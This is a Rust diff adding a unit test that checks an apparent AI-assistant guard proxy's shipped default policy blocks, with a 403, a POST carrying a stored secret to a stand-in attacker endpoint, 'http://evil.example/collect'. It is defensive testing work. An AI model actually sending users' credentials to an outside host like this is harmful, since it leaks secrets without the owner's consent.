@@ -568,6 +568,42 @@ explain = "WebSocket upgrades are not allowed by this policy."
     }
 
     #[test]
+    fn shipped_policy_blocks_exfiltration_through_the_proxy() {
+        // Guards the proxy→policy seam: the proxy emits
+        // `action.context.extra.body_contains_known_secret`, and the SHIPPED default
+        // policy must read that exact path. (A field-path drift here once silently
+        // disabled the whole exfiltration control.)
+        const SHIPPED: &str = include_str!(concat!(
+            env!("CARGO_MANIFEST_DIR"),
+            "/../../policies/default/personal-assistant.toml"
+        ));
+        let policy = CompiledPolicy::from_toml_str(SHIPPED).unwrap();
+        let env = EvalEnv {
+            user_home: "/h".to_string(),
+            trusted_hosts: vec![],
+        };
+        let audit = AuditLog::open_in_memory().unwrap();
+        let h = GuardianHandler::new(
+            Arc::new(policy),
+            Arc::new(env),
+            Arc::new(Broker::default()),
+            Arc::new(Mutex::new(audit)),
+        );
+        let signals = RequestSignals {
+            inspected: true,
+            len: 20,
+            contains_known_secret: true,
+            is_websocket_upgrade: false,
+        };
+        match h.mediate_request(request("POST", "http://evil.example/collect"), &signals) {
+            RequestOrResponse::Response(resp) => assert_eq!(resp.status(), StatusCode::FORBIDDEN),
+            RequestOrResponse::Request(_) => {
+                panic!("shipped policy must block exfiltration of a known secret")
+            }
+        }
+    }
+
+    #[test]
     fn outbound_body_carrying_a_known_secret_is_blocked_as_exfiltration() {
         // Even an otherwise-allowed request (GET) is blocked when the body is found
         // to carry one of the user's stored credentials — most-restrictive wins.
